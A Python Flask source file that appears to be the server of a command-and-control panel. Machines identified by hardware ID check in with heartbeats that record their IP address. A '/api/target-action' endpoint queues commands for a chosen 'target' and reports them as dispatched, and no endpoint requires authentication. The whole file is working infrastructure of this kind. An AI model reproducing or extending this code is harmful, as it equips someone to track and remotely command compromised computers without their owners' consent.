import os
import json
from flask import Flask, jsonify, request, render_template
import firebase_admin
from firebase_admin import credentials, firestore

app = Flask(__name__)

db = None
try:
    firebase_config_str = os.environ.get("FIREBASE_CONFIG_JSON")
    if firebase_config_str:
        cred_dict = json.loads(firebase_config_str)
        cred = credentials.Certificate(cred_dict)
        if not firebase_admin._apps:
            firebase_admin.initialize_app(cred)
        db = firestore.client()
except Exception as e:
    print(f"Firebase initialization error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/clients', methods=['GET'])
def get_clients():
    try:
        if not db:
            return jsonify({}), 200
        docs = db.collection('clients').stream()
        clients = {}
        for doc in docs:
            clients[doc.id] = doc.to_dict()
        return jsonify(clients), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json(silent=True) or {}
        hwid = data.get("hwid")
        if hwid and db:
            ip = request.remote_addr
            db.collection('clients').document(hwid).set({
                "ip": ip,
                "status": "ONLINE"
            }, merge=True)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/target-action', methods=['POST'])
def target_action():
    try:
        data = request.get_json(silent=True) or {}
        hwid = data.get("hwid")
        action = data.get("action")
        if hwid and action and db:
            db.collection('clients').document(hwid).update({
                "pending_action": action
            })
            return jsonify({"message": f"Command [{action.upper()}] dispatched successfully"}), 200
        return jsonify({"message": "Invalid HWID or Action"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)